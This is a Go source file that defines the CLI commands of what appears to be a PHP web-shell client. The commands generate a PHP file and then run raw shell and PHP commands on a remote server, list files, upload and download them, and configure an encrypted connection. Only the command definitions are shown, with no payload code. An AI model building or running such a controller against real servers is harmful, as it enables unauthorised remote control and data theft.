package app

import (
	"github.com/urfave/cli"
)

func (main *MainInterface) _buildCommand() {
	var helpDefinition = cli.Command{
		Name:    "help",
		Aliases: []string{"h"},
		Usage:   "Help of application",
		Action:  main.Help,
		Flags: []cli.Flag{
			cli.BoolFlag{Name: "t"},
		},
	}

	var generateDefinition = cli.Command{
		Name:    "generate",
		Aliases: []string{"g"},
		Usage:   "Generate php file",
		Action:  main.Generate,
	}

	var exitDefinition = cli.Command{
		Name:    "exit",
		Aliases: []string{"e"},
		Usage:   "Exit the application",
		Action:  main.Exit,
	}

	var encodeDefinition = cli.Command{
		Name:   "encode",
		Usage:  "Encode a string to base64",
		Action: main.Encode,
	}

	var decodeDefinition = cli.Command{
		Name:   "decode",
		Usage:  "Decode a base64 string",
		Action: main.Decode,
	}

	var srvDefinition = cli.Command{
		Name:    "srv",
		Aliases: []string{"s"},
		Usage:   "Prefix to make server command",
		Subcommands: []cli.Command{
			{
				Name:   "test",
				Usage:  "Test if server connexion is ok",
				Action: main.SendTest,
			},
			{
				Name:   "bash",
				Usage:  "Open meterpreter like session (command are send raw to the server)",
				Action: main.StartBash,
			},
			{
				Name:  "exec",
				Usage: "Execute a special command on server",
				Subcommands: []cli.Command{
					{
						Name:   "php",
						Usage:  "Execute php on server",
						Action: main.SendRawPHP,
					},
					{
						Name:   "ls",
						Usage:  "List file on server",
						Action: main.SendLs,
						Flags: []cli.Flag{
							cli.BoolFlag{Name: "raw, send a raw ls"},
						},
					},
					{
						Name:   "upload",
						Usage:  "Upload a file (by path) on server",
						Action: main.SendUpload,
					},
					{
						Name:   "download",
						Usage:  "Download a file (by path) on server",
						Action: main.SendDownload,
					},
				},
			},
			{
				Name:   "config",
				Usage:  "Configure server",
				Action: main.ServerSetup,
				Flags: []cli.Flag{
					cli.StringFlag{Name: "u, url", Usage: "Url of the server. Ex: -u http://localhost"},
					cli.IntFlag{Name: "m, method", Usage: "Method to use. Ex: -m 1"},
					cli.StringFlag{Name: "p, parameter", Usage: "Parameter to use. Ex: -p test"},
					cli.BoolFlag{Name: "f, file", Usage: "Use a config from file (default path : ./config)"},
					cli.BoolFlag{Name: "c, crypt", Usage: "Use a crypt"},
					cli.BoolFlag{Name: "i, info", Usage: "Give info on actual config"},
				},
			},
			{
				Name:   "info",
				Usage:  "Give information on the last specified item. Ex: srv info request",
				Action: main.ServerInfo,
				Flags: []cli.Flag{
					cli.BoolFlag{Name: "url", Usage: "Shows request's url"},
					cli.BoolFlag{Name: "method", Usage: "Shows request's method"},
					cli.BoolFlag{Name: "status", Usage: "Shows response's status"},
					cli.BoolFlag{Name: "request", Usage: "Shows response's interpreted request"},
					cli.BoolFlag{Name: "body", Usage: "Shows item's body"},
					cli.BoolFlag{Name: "headers", Usage: "Shows item's headers"},
				},
			},
		},
	}

	main.commands = []cli.Command{
		generateDefinition,
		srvDefinition,
		encodeDefinition,
		decodeDefinition,
		helpDefinition,
		exitDefinition,
	}
}
